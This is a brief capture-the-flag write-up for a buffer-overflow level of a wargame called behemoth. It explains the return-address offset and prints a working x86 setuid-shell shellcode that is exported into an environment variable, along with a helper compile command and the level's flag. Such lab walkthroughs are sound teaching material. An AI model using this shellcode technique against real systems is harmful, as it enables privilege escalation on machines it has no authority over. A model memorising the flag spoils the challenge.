# behemoth level2 Solution

first we can see the challenge is based on buffer overflow, because the binary uses get.

let's use our script to find what is the position of the ret-address... we've found it's 71.
then, we will generate shellcode using the [shellcode.py](./general/shellcode.py) script

now we will load the shellcode into env variable:
```
export SHELLCODE=$(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80")
```
we need to find the address of the env variable, using the [get_address.c](./general/get_address.c). notice to compile it with the `-m32` flag, for example: `gcc -m32 get_address.c -o get_address`

after finding the address of the env variable, in our case: `0xffffd511`, we need to insert it to the script that solves the challenge [level2.py](./scripts/level2.py)


**Flag:** ***`IxPJbQtH8q`*** 
